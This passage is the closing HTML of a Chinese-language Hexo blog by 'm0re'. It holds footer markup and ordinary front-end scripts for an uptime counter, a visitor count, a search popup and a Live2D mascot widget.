}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">豫ICP备2020025591号-1</a></div><div class="copyright"><span>&copy; 2020 – 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v5.1.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>本博客已苟延残喘了</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="总访客量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>